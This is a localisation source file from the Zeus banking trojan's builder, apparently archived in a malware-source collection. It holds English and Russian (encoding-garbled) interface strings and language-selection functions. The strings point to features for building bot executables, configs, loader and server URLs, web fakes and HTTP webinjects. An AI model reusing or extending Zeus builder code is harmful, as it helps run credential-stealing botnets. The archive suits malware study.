/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "defines.h"
#include "languages.h"
#include "main.h"

#include "..\common\str.h"

//English.
static const LPWSTR languageEn[] =
{
  L"Not enough memory",
  L"Failed to write output file.",
  L"\r\nERROR: %s",

  BO_NAME L" Builder",

  L"Information",
#if(BO_CLIENT_PLATFORMS > 0)
  L"Builder",
#endif
  L"Settings",

  L"Current version",
  L"Version: %u.%u.%u.%u\r\nBuild time: %s\r\nSignature: %S",
  L"Information about active bot",
  L"Encryption key:",
  L"Information:",
  L"Refresh",
  L"Remove bot",
  L"Removing bot...",
  L"Bot removed! Please restart computer for full removing.",
  L"Failed to remove bot! Try again or restart computer.",
  L"-- default --",
  L"Version: %u.%u.%u.%u\r\nBotnet: %s\r\nFile of loader: ~\\%s",
  L"Bot not founded.",

#if(BO_CLIENT_PLATFORMS > 0)
  L"Source configuartion file:",
  L"Browse...",
  L"Edit...",
  L"Actions",
  L"Build the bot configuration",
  L"Build the bot executable",
  L"-- file not selected --",
  L"Failed to execute external editor.",
  L"Failed to read configuration file.",

  L"Building the bot...",
  L"Loading configuration...",
  L"Creating executable file...",
  L"Size of output file is %u bytes.",
  L"\r\nBUILD SUCCEEDED!",
  
  L"Building configuration of bot...\r\n",
  L"\r\nBUILD SUCCEEDED!",
  L"Failed to find \"StaticConfig\".",
  L"Maximum length of value \"StaticConfig/botnet\" can not be more than %u characters long.",
  L"Failed to find \"StaticConfig/url_config\".",
  L"Maximum length of value \"StaticConfig/url_config\" can not be more than %u characters long.",
  L"Failed to find \"StaticConfig/encryption_key\".",
  L"Source executable file corrupted.",
  L"Failed to find \"DynamicConfig\".",
  L"Failed to find \"DynamicConfig/url_loader\".",
  L"Failed to find \"DynamicConfig/url_server\".",
  L"Error founded in \"DynamicConfig/AdvancedConfigs\".",
#if(BO_WININET > 0)
  L"Error founded in \"DynamicConfig/WebFilters\".",
  L"Error founded in \"DynamicConfig/WebDataFilters\".",
#endif  
  L"Error founded in \"DynamicConfig/WebFakes\".",
  L"Error founded in \"DynamicConfig/file_webinjects\".",
  L"Building the HTTP injects...",
  L"Failed to open file of HTTP injects.",
  L"Bad HTTP-inject founded.",
#endif

  L"Language:",
  L"Apply",
  L"For apply the language you should restart application.",
  L"Failed to save all settings.",
};

//Russian language.
static const LPWSTR languageRu[] =
{
  L"������������ ������.",
  L"�� ������� ��������� ����.",
  L"\r\n������: %s",

  BO_NAME L" Builder",

  L"����� ����������",
#if(BO_CLIENT_PLATFORMS > 0)
  L"������",
#endif
  L"�����",

  L"������� ������",
  L"������: %u.%u.%u.%u\r\n����� ������: %s\r\n��������� ������: %S",
  L"���������� � ���������� ����",
  L"���� ����������:",
  L"����������:",
  L"��������",
  L"������� ����",
  L"�������� ����...",
  L"��� ������! ����������, ������������� ��������� ��� ������� �������� ����.",
  L"�� ������� ������� ����! ���������� �����, ��� ������������� ���������.",
  L"-- default --",
  L"������: %u.%u.%u.%u\r\n������: %s\r\n���� �������: ~\\%s",
  L"��� �� ������.",

#if(BO_CLIENT_PLATFORMS > 0)
  L"�������� ���� ������������:",
  L"�����...",
  L"������...",
  L"��������",
  L"������� ������������ ����",
  L"������� ����",
  L"-- ���� �� ������ --",
  L"�� ������� ��������� ������� ��������.",
  L"�� ������� ��������� ���� ������������.",

  L"������ ����...",
  L"�������� ������������...",
  L"�������� EXE-�����...",
  L"������ ����� %u ����.",
  L"\r\n������ ������� ���������!",
  
  L"������ ������������ ����...\r\n",
  L"\r\n������ ������� ���������!",  
  L"�� ������� ����� \"StaticConfig\".",\
  L"������������ ����� �������� ��� \"StaticConfig/botnet\" �� ����� ���� ����� %u ��������.",
  L"�� ������� ����� \"StaticConfig/url_config\".",
  L"������������ ����� �������� ��� \"StaticConfig/url_config\" �� ����� ���� ����� %u ��������.",
  L"�� ������� ����� \"StaticConfig/encryption_key\".",
  L"�������� PE-���� ���������.",
  L"�� ������� ����� \"DynamicConfig\".",
  L"�� ������� ����� \"DynamicConfig/url_loader\".",
  L"�� ������� ����� \"DynamicConfig/url_server\".",
  L"���������� ������ � \"DynamicConfig/AdvancedConfigs\".",
#if(BO_WININET > 0)
  L"���������� ������ � \"DynamicConfig/WebFilters\".",
  L"���������� ������ � \"DynamicConfig/WebDataFilters\".",
#endif
  L"���������� ������ � \"DynamicConfig/WebFakes\".",
  L"���������� ������ � \"DynamicConfig/file_webinjects\".",
  L"������ HTTP-��������...",
  L"�� ������� ������� ���� � HTTP-���������.",
  L"��������� HTTP-������ � �������.",
#endif

  L"���� ����������:",
  L"���������",
  L"��� ���������� ����� ���������� ������������� ����������.",
  L"�� ������� ��������� ��� ���������.",
};

//A list of available languages.
static const Languages::LANGINFO languages[] =
{
  {L"English",           languageEn, sizeof(languageEn) / sizeof(LPWSTR), 1033},
  {L"������� (Russian)", languageRu, sizeof(languageRu) / sizeof(LPWSTR), 1049}
};

//Of the current language.
static const Languages::LANGINFO *languageCur;

void Languages::init(void)
{
  //Default language.
  languageCur = &languages[0];
  
  //Obtain the language of the system.
  WORD langId = CWA(kernel32, GetUserDefaultUILanguage)();
  for(BYTE i = 0; i < sizeof(languages) / sizeof(Languages::LANGINFO); i++)if(langId == languages[i].id){languageCur = &languages[i]; break;}
  
  //Obtain language from the config.
  langId = CWA(kernel32, GetPrivateProfileIntW)(L"settings", L"language", langId, settingsFile);
  for(BYTE i = 0; i < sizeof(languages) / sizeof(Languages::LANGINFO); i++)if(langId == languages[i].id){languageCur = &languages[i]; break;}
}

void Languages::uninit(void)
{

}

LPWSTR Languages::get(DWORD id)
{
  return (id < languageCur->stringsCount) ? languageCur->strings[id] : NULL;
}

bool Languages::setDefaultLangId(WORD langId)
{
  WCHAR str[10];
  Str::_FromInt32W(langId, str, 10, false);
  return CWA(kernel32, WritePrivateProfileStringW)(L"settings", L"language", str, settingsFile) == FALSE ? false : true;
}

const Languages::LANGINFO *Languages::getLangInfo(WORD index)
{
  if(index < sizeof(languages) / sizeof(Languages::LANGINFO))return &languages[index];
  return NULL;
}

const Languages::LANGINFO *Languages::getCurLangInfo(void)
{
  return languageCur;
}
